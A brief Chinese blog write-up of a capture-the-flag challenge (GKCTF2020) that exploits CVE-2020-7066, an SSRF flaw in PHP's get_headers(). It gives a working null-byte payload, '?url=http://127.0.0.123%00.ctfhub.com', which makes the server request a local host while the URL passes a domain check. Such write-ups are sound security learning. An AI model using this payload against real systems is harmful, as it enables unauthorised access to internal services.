---
title: '[GKCTF2020]cve版签到'
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/avatar.jpg'
authorAbout: steamID：888007034
authorDesc: 'Blizzard：TroyeSivan#51769'
categories: 技术
comments: true
date: 2020-07-18 14:25:55
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/sfgsagfw.jpg
---
根据hint可知考察cve-2020-7066，是一个ssrf漏洞
https://www.anquanke.com/vul/id/1966253

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200718145218.png)

结合cve可知，get_headers()函数存在漏洞。通过\0截断，访问本地主机。经过尝试，题目这里需使用%00截断
?url=http://127.0.0.123%00.ctfhub.com

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200718150353.png)

提示要以123 结束，
得到flag：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ图片20200718150619.png)